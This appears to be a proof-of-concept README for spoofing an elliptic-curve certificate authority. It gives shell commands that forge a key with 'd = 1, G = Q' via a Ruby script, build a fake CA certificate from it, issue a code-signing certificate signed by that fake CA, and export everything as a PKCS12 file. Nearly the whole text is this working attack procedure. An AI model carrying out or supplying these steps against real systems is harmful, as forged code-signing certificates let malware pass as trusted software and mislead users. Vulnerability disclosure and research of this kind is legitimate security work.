You can create a CA with the following command:

    $ openssl ecparam -name secp384r1 -genkey > ca.key
    $ openssl req -new -x509 -key ca.key -out ca.crt

The PoC assumes you have the certificate of the CA you wish to spoof. In the following example, the certificate uses NIST P-384 (secp384r1) curve, but this works for different curves as well.

    # forge a spoofing key, where d = 1, G = Q
    $ ruby main.rb > fake.key 

    # generate a spoofing certificate with the spoofing key
    $ openssl req -new -x509 -key fake.key -out fake.crt 

    # generate a key for your own certificate:
    $ openssl ecparam -name secp384r1 -genkey > cert.key 

    # request a certificate signing request for code signing:
    $ openssl req -new -key cert.key -out cert.csr -config openssl.conf 

    # sign the certificate request with our fake certificate and fake key
    $ openssl x509 -req -days 365 -in cert.csr -CA fake.crt -CAkey fake.key -out cert.crt -CAcreateserial

    # pack the certificate with its key and the fake certificate into a pkcs12 file
    $ openssl pkcs12 -export -in cert.crt -inkey cert.key -certfile fake.crt -out cert.p12

